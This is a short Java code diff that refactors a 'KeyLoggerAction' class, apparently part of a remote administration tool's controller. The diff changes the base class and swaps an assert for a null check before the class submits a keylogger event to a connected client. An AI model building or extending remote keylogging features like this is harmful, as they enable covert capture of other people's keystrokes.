@@ -1,27 +1,28 @@
 package TableUtils.KeyLogger.Actions;
 
 import Server.Client;
-import Utilities.AbstractActionGUI;
+import Utilities.Action.AbstractActionGUI;
 import Utilities.AbstractDialogCreator;
+import Utilities.Action.AbstractActionNoGUI;
 import Utilities.GetSYS;
 import TableUtils.KeyLogger.Constants.KeyLog;
 import TableUtils.KeyLogger.Events.KeyloggerEvent;
 
 import java.awt.event.ActionEvent;
 
-public class KeyLoggerAction extends AbstractActionGUI<AbstractDialogCreator> {
+public class KeyLoggerAction extends AbstractActionNoGUI {
 
     private final KeyLog keyLog;
 
-    public KeyLoggerAction(KeyLog keyLog) {
-        super(null);
+    public KeyLoggerAction(KeyLog keyLog){
         this.keyLog = keyLog;
     }
+
 
     @Override
     public void actionPerformed(ActionEvent e) {
         Client client = GetSYS.getClientHandler();
-        assert client != null;
-        client.getExecutor().submit(new KeyloggerEvent(client, keyLog));
+        if (client != null)
+            client.getExecutor().submit(new KeyloggerEvent(client, keyLog));
     }
 }
